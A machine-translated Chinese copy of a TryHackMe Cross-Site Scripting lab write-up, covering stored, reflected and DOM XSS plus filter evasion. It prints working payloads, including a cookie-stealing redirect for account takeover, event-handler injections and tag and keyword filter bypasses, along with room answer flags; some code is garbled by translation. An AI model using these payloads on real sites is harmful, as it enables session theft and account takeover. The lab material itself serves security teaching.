<html>
<head>
<title>TryHackme — Cross-Site Scripting</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackme —跨站点脚本</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-cross-site-scripting-bcb7c876ae6a?source=collection_archive---------0-----------------------#2022-01-03">https://infosecwriteups.com/tryhackme-cross-site-scripting-bcb7c876ae6a?source=collection_archive---------0-----------------------#2022-01-03</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="b12a" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">恶意脚本注入</h2></div><p id="34e8" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">2022年新年，欢迎神奇的黑客们回来。我想出了一个很酷的关于跨站点脚本的有趣话题的博客。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi lb"><img src="../Images/03709a2ea8fd01530e28ecdd8f4526dd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*echLSvKiojcfhlD_"/></div></div></figure><p id="6e32" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在web应用程序上发现的一个安全漏洞。攻击者使用这些恶意脚本，并且必须在受害者机器上执行。</p><p id="5baf" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">跨站点站点脚本涉及的类型有:</p><ol class=""><li id="a9a1" class="ln lo iq kh b ki kj kl km ko lp ks lq kw lr la ls lt lu lv bi translated">存储的XSS</li><li id="36cd" class="ln lo iq kh b ki lw kl lx ko ly ks lz kw ma la ls lt lu lv bi translated">反映了XSS</li><li id="f869" class="ln lo iq kh b ki lw kl lx ko ly ks lz kw ma la ls lt lu lv bi translated">多姆XSS</li></ol><p id="937f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">跨站点脚本可以做很多事情，例如:</p><ol class=""><li id="4c9d" class="ln lo iq kh b ki kj kl km ko lp ks lq kw lr la ls lt lu lv bi translated">cookie窃取—使用跨站点脚本，可以从未经验证的会话中窃取cookie。</li><li id="11ea" class="ln lo iq kh b ki lw kl lx ko ly ks lz kw ma la ls lt lu lv bi translated">击键记录—使用跨站点方式来捕获击键。</li><li id="adf1" class="ln lo iq kh b ki lw kl lx ko ly ks lz kw ma la ls lt lu lv bi translated">网络摄像头快照—从受损的机器上拍摄快照</li><li id="525b" class="ln lo iq kh b ki lw kl lx ko ly ks lz kw ma la ls lt lu lv bi translated">网络钓鱼—攻击者在合法网站中插入伪造的登录表单，或者重定向到恶意网站。</li><li id="091d" class="ln lo iq kh b ki lw kl lx ko ly ks lz kw ma la ls lt lu lv bi translated">端口扫描—用于扫描内部网络并识别网络中的主机列表。</li><li id="d53b" class="ln lo iq kh b ki lw kl lx ko ly ks lz kw ma la ls lt lu lv bi translated">其他浏览器漏洞</li></ol><p id="8cff" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">存储的XSS: </strong></p><p id="1053" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">存储XSS是一种危险的跨站点脚本。如果不可信的用户输入没有被净化，那么它将被注入到数据库中。</p><blockquote class="mb mc md"><p id="c7d5" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">任务1:添加评论，看看你是否能插入一些你自己的HTML。</p></blockquote><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi mi"><img src="../Images/4eaae924589c41566a1c6a7f02faaa9e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1164/format:webp/1*b95RU77VFuPDwENgQm8iXA.png"/></div></div></figure><p id="8f28" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后你会在网页上看到评论。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi mj"><img src="../Images/4a7187d21d68f00af1d095933252a44c.png" data-original-src="https://miro.medium.com/v2/resize:fit:422/format:webp/1*eraXuKioYV0_l-iWkh8c4w.png"/></div></figure><blockquote class="mb mc md"><p id="19ae" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">任务2:创建一个警告弹出框，出现在带有您的文档cookies的页面上。</p></blockquote><p id="825a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">解决方案:<script> alert(document.cookie) </script></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi mk"><img src="../Images/7885c8f5e979995bcb1c1e74b2e05e53.png" data-original-src="https://miro.medium.com/v2/resize:fit:504/format:webp/1*Duyw_Ffd9CV8Am5O5-cnMw.png"/></div></figure><blockquote class="mb mc md"><p id="8b9c" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">任务3:通过添加评论和使用Javascript将“XSS游乐场”改为“我是黑客”。</p></blockquote><p id="a0b3" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">解决方案:<script>document . query selector(# thm-title)。textContent = '我是黑客'</script></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi ml"><img src="../Images/b13d2c5b91d159e700efdaadb5665252.png" data-original-src="https://miro.medium.com/v2/resize:fit:1246/format:webp/1*fIvIrKlIkIEesXEz71n2Bg.png"/></div></figure><blockquote class="mb mc md"><p id="4f30" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">任务4:通过窃取Jack的cookie来接管他的帐户，他的cookie值是多少？</p></blockquote><p id="e5a1" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">解决方案:<script>document . location = '/log/'+document . cookie</script></p><p id="08f6" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">键入此注释后，移动到web应用程序的/log目录。</p><p id="f628" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">s % 3 at 0 yyhmitfnsf0k M5 ne-IR 1 sktx 3 aeu . yj1 % 2 fxoaxe 7 ccjuymfgqpw 3 o5 WP 3 o 8 AE 7 ynhnhpjiase</p><p id="6720" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">任务5:以杰克的身份发表评论。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi mm"><img src="../Images/d6b7ce67152c03e0add56ce283375839.png" data-original-src="https://miro.medium.com/v2/resize:fit:316/format:webp/1*FTFASGfHT4XJdlmvnfjPNw.png"/></div></figure><p id="1b40" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">映XSS: </strong></p><p id="db47" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">恶意有效负载用于向用户发送并回复。攻击者通过社会工程点击了精心制作的有效负载。</p><blockquote class="mb mc md"><p id="53bf" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">制作一个反射的XSS有效载荷，它会弹出一个说“你好”的窗口</p></blockquote><p id="5119" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ThereIsMoreToXSSThanYouThink</p><blockquote class="mb mc md"><p id="7168" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">创建一个反射的XSS有效载荷，它会弹出一个显示你机器IP地址的窗口。</p></blockquote><p id="b2b8" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ReflectiveXss4TheWin</p><p id="ca9e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">多姆·XSS</p><p id="d042" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在基于DOM的XSS攻击中，在执行网站的合法JavaScript之前，恶意有效载荷不会被受害者的浏览器实际解释。那么，这到底意味着什么呢？</p><blockquote class="mb mc md"><p id="18de" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">查看已部署的机器上基于DOM的XSS页面源代码，并找出一种利用cookies执行警报的方法。</p></blockquote><p id="e172" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">测试" onmouseover = " alert(document . cookie)"</p><p id="6cea" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">答:BreakingAnElementsTag</p><blockquote class="mb mc md"><p id="de76" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">在图像标签上创建一个<em class="iq">on over</em>事件，将网站的背景色改为红色。</p></blockquote><p id="d444" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">解决方案:test " onmouseover = " document . body . style . background color = ' red '；</p><p id="e570" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ans:JavaScript sawesome</p><p id="b082" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">防火墙规避:</strong></p><blockquote class="mb mc md"><p id="f98d" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">绕过删除任何脚本标记的过滤器。</p></blockquote><p id="1209" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">解决方案:<img src="x" onerror="alert(‘Hello’);"/></p><p id="1013" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ans:3c cf 8d 90 aaece 81710 ab 9 db 759352 c 0</p><blockquote class="mb mc md"><p id="ca83" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">警报这个词被过滤了，绕过它。</p></blockquote><p id="9c13" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">解决方案:0\ "自动对焦/onfocus = alert(1)→<video>-确认(3)-"</video></p><p id="3f9d" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ans:a2 e 5 ef 66 f 5 ff 584 a 01d 734 ef 5 edaae 91</p><blockquote class="mb mc md"><p id="16d9" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">你好这个词被过滤了，绕过它。</p></blockquote><p id="3691" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">解决方案:<img src="”baj”" onerror="alert(“HHelloello”)"/></p><p id="decc" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">答案:decba 45d 0eff 17 c 6 eed 1629393 bee 1d</p><blockquote class="mb mc md"><p id="df63" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">挑战4中的筛选如下:</p><p id="f3c4" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">单词“你好”</p><p id="c49e" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">脚本</p><p id="a7a2" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">错误</p><p id="af6f" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">onsubmit</p><p id="4c76" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">装载</p><p id="7a85" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">onmouseover</p><p id="4ccb" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">专注</p><p id="ef33" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">onmouseout</p><p id="6ee4" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">在线按键</p><p id="6eb6" class="kf kg me kh b ki kj jr kk kl km ju kn mf kp kq kr mg kt ku kv mh kx ky kz la ij bi translated">onchange</p></blockquote><p id="e230" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">答案:2482 d2e 8939 fc85a 9363617782270555</p></div></div>    
</body>
</html>